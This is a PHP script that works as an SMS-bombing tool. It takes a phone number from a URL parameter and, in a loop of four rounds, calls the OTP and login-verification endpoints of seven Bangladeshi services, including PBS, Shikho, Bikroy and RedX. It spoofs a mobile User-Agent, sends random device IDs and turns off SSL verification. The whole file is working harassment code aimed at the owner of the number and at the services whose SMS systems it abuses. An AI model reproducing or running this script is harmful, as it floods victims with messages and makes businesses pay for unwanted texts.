<?php
header('Content-Type: application/json');
set_time_limit(0);

$phone = $_GET['phone'] ?? '';
if(empty($phone)) {
    echo json_encode(["status" => "error", "message" => "Phone number missing"]);
    exit;
}

$phone_11 = (substr($phone, 0, 2) === "88") ? substr($phone, 2) : $phone;
$cookieFile = __DIR__ . '/cookies.txt';
if (!file_exists($cookieFile)) { touch($cookieFile); chmod($cookieFile, 0666); }

function request($url, $method = 'GET', $data = null, $headers = []) {
    global $cookieFile;
    $ch = curl_init();
    $options = [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_COOKIEJAR => $cookieFile,
        CURLOPT_COOKIEFILE => $cookieFile,
        CURLOPT_CUSTOMREQUEST => $method,
        CURLOPT_HTTPHEADER => array_merge(['User-Agent: Mozilla/5.0 (Android 10; Mobile)'], $headers),
        CURLOPT_TIMEOUT => 15,
        CURLOPT_FOLLOWLOCATION => true
    ];
    if ($data) $options[CURLOPT_POSTFIELDS] = json_encode($data);
    curl_setopt_array($ch, $options);
    $res = curl_exec($ch);
    curl_close($ch);
    return json_decode($res, true) ?: $res;
}

$responses = [];

// প্রতি সার্ভিসের জন্য ৪ বার লুপ
for($i=1; $i<=4; $i++){
    $responses["pbs_$i"] = request('https://apialpha.pbs.com.bd/api/OTP/generateOTP', 'POST', ["userPhone" => $phone_11], ['Content-Type: application/json']);
    sleep(1);
    
    $responses["shikho_$i"] = request('https://api.shikho.com/auth/v2/send/sms', 'POST', ["phone" => "88".$phone_11, "type" => "student"], ['Content-Type: application/json']);
    sleep(1);
    
    $responses["iqra_$i"] = request("https://apibeta.iqra-live.com/api/v2/sent-otp/".$phone_11, 'GET', null, ['Origin: https://iqra-live.com']);
    sleep(1);
    
    $responses["truck_$i"] = request('https://tethys.trucklagbe.com/tl_gateway/tl_login/128/loginWithPhoneNo', 'POST', ["userType" => "shipper", "phoneNo" => $phone_11], ['Content-Type: application/json', 'deviceId: '.rand(100,999).time(), 'lat: 23.8103', 'lng: 90.4125']);
    sleep(1);
    
    $responses["bdtickets_$i"] = request('https://api.bdtickets.com:20100/v1/auth', 'POST', ["createUserCheck"=>true,"phoneNumber"=>"88".$phone_11,"applicationChannel"=>"WEB_APP"], ['Content-Type: application/json']);
    sleep(1);
    
    $responses["bikroy_$i"] = request("https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11", 'GET');
    sleep(1);
    
    $responses["redx_$i"] = request('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', 'POST', ["phoneNumber" => $phone_11], ['Content-Type: application/json', 'Origin: https://redx.com.bd']);
    sleep(1);
}

echo json_encode($responses, JSON_PRETTY_PRINT);
?>
